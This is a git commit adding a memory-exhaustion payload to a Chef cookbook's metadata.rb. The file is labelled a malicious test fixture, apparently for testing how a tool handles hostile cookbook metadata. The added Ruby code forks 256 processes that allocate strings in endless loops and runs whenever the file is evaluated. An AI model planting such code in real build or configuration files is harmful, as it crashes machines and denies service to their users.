c60923c3e3d32c408abcdf02fb2c579e597ef4a8
Tony Spataro <tony@rightscale.com>
2013-08-12 16:31:47 -0700

    Implement malicious memory exhaustion attack

--- cookbooks/malicious/metadata.rb
+++ cookbooks/malicious/metadata.rb
@@ -3,7 +3,15 @@ maintainer_email "support@rightscale.com"
 description "Test fixture with malicious metadata.rb"
 version "1.0.0"
 
-# TODO something actually malicious
+# Attempt to exhaust the machine's memory by performing a bunch of heap allocations
+256.times do
+  fork do
+    strings = []
+    loop do
+      strings << (rand(10).to_s * 1024)
+    end
+  end
+end
 
 recipe "malicious::default", "Do nothing. With evil intent."
 
